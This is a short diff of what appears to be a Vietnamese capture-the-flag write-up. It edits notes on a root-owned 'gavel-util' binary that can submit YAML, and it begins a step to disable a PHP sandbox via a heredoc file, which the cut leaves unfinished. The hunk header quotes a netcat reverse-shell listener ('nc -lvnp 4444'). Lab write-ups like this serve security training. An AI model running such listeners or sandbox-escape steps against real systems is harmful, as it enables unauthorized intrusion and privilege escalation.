@@ -76,10 +76,10 @@ nc -lvnp 4444
 ![alt text](image-13.png)
 
 - Điều cần chú ý ở đây : `-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util`
-  - Owner: `root`
+  - User: `root`
   - Group: `gavel-seller`
   - Binary có thể được dùng để submit YAML
-
+  
 - Vô hiệu hóa PHP sandbox
 ```code
 cat > /home/auctioneer/fix_ini.yaml << 'EOF'
